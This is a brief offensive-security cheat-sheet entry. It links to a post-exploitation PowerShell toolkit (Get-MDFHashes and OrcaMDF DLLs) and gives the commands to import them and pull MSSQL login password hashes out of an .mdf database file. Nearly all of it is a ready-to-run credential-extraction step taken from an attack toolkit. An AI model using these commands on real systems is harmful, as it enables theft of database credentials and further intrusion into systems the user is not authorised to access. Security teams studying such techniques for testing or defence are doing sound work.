### source
https://raw.githubusercontent.com/xpn/Powershell-PostExploitation/master/Invoke-MDFHashes/Get-MDFHashes.ps1  
https://github.com/xpn/Powershell-PostExploitation/raw/master/Invoke-MDFHashes/OrcaMDF.Framework.dll  
https://github.com/xpn/Powershell-PostExploitation/raw/master/Invoke-MDFHashes/OrcaMDF.RawCore.dll  

### get hash from mdf mssql database file
```
Import-Module .\OrcaMDF.RawCore.dll
Import-Module .\OrcaMDF.Framework.dll
Import-Module .\Get-MDFHashes.ps1
Get-MDFHashes -mdf "<fullPathToFile>.mdf"
```

